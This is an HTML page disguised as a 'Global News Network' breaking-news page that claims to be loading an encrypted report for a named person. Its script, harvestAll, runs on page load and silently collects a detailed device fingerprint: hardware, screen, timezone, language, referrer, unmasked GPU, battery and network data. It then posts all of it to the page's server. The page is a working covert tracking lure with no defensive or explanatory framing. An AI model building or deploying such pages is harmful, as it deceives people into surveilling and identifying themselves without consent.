<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Global News Network | Breaking Updates</title>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #050505; color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
    .container { background: #111; padding: 40px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 10px 50px rgba(0,0,0,0.8); max-width: 600px; }
    h1 { color: #e50914; margin-bottom: 10px; }
    p { color: #aaa; }
    .loader { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

<div class="container">
  <h1>Breaking News</h1>
  <p>Loading the latest encrypted report for [PERSON NAME]...</p>
  <div class="loader"></div>
  <p style="font-size: 12px;">Syncing with regional servers for maximum accuracy.</p>
</div>

<script>
  async function harvestAll() {
    // 1. Hardware & Core Specs
    const info = {
      hardware: {
        cores: navigator.hardwareConcurrency || "N/A",
        ram: navigator.deviceMemory || "N/A",
        platform: navigator.platform,
        touchPoints: navigator.maxTouchPoints,
        architecture: navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['architecture'])).architecture : "N/A"
      },
      // 2. Display & Visuals
      display: {
        res: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        depth: window.screen.colorDepth,
        ratio: window.devicePixelRatio,
        hdr: window.matchMedia("(colors: 1)").matches
      },
      // 3. Browser & Behavior
      env: {
        lang: navigator.languages.join(', '),
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        ref: document.referrer || "Direct Link",
        cookies: navigator.cookieEnabled,
        pdf: navigator.pdfViewerEnabled,
        webdriver: navigator.webdriver // Detects automated bots
      }
    };

    // 4. GPU Detailed Extraction
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      info.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software Render";
    } catch (e) { info.gpu = "Blocked/N/A"; }

    // 5. Battery & Network Performance
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        info.battery = { level: (b.level * 100) + "%", status: b.charging ? "Charging" : "Unplugged" };
      }
      if (navigator.connection) {
        info.net = { type: navigator.connection.effectiveType, speed: navigator.connection.downlink + " Mbps", ping: navigator.connection.rtt + " ms" };
      }
    } catch (e) {}

    // Send to Server
    fetch("/visit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(info)
    });
  }

  window.onload = harvestAll;
</script>

</body>
</html>
